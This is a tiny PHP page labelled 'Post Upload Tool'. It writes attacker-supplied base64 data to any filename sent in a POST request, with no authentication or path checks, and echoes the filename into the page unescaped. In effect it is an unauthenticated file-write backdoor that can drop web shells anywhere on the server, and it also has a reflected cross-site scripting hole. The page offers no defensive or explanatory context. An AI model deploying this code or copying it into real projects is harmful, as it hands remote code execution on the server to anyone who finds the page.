<html><head><title>Post Upload Tool</title><body>
<?php
    $filename = $_POST['filename'];
    $filedata = base64_decode($_POST['filedata']);
    echo "<h1>$filename</h1>";
    $fout = fopen($filename,"wb");
    fwrite($fout, $filedata);
    fclose($fout);
?>
</body></html>
